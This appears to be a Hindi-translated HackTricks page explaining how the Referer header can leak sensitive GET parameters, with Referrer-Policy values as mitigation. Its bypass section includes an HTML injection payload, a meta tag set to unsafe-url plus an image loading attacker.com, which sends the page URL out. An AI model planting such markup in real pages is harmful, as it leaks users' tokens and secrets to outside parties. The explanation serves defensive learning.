<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.

</details>


# Referrer headers और policy

Referrer वह header है जिसका उपयोग ब्राउज़र यह इंगित करने के लिए करते हैं कि पिछला पृष्ठ कौन सा था।

## संवेदनशील जानकारी का लीक होना

यदि किसी वेब पेज के अंदर किसी बिंदु पर कोई संवेदनशील जानकारी GET request पैरामीटर्स पर स्थित होती है, और यदि पेज में बाहरी स्रोतों के लिंक होते हैं या एक हमलावर उपयोगकर्ता को उस URL पर जाने के लिए मना सकता है (सामाजिक इंजीनियरिंग) जो हमलावर द्वारा नियंत्रित होता है। तो वह नवीनतम GET request के अंदर संवेदनशील जानकारी को बाहर निकालने में सक्षम हो सकता है।

## निवारण

आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए बना सकते हैं जो संवेदनशील जानकारी को अन्य वेब एप्लिकेशन्स को भेजे जाने से **रोक** सकता है:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## प्रतिरोध-निवारण

आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को HTML इंजेक्शन का शोषण करने की आवश्यकता है):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## रक्षा

URL में GET पैरामीटर्स या पथों के अंदर कभी भी संवेदनशील डेटा न रखें।


<details>

<summary><strong> AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>